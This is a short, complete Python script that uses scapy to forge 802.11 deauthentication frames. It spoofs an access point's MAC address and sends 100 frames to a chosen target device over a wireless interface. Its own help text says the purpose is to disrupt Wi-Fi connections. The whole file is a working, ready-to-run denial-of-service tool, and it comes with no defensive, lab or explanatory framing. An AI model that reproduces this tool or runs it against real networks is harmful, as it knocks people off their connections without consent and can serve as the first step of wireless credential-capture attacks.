import argparse
from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp

def send_deauth_packets(target_mac, ap_mac, iface):
    dot11 = Dot11(addr1=target_mac, addr2=ap_mac, addr3=ap_mac)
    packet = RadioTap() / dot11 / Dot11Deauth(reason=7)
    
    print(f"Sending deauth packets to {target_mac} from {ap_mac} on interface {iface}")
    sendp(packet, iface=iface, count=100, inter=.2)

def main():
    parser = argparse.ArgumentParser(description="Send de-authentication packets to disrupt Wi-Fi connections.")
    parser.add_argument("-t", "--target_mac", required=True, help="MAC address of the target device")
    parser.add_argument("-a", "--ap_mac", required=True, help="MAC address of the access point")
    parser.add_argument("-i", "--interface", required=True, help="Network interface to use (e.g., wlan0)")
    
    args = parser.parse_args()

    send_deauth_packets(args.target_mac, args.ap_mac, args.interface)

if __name__ == "__main__":
    main()
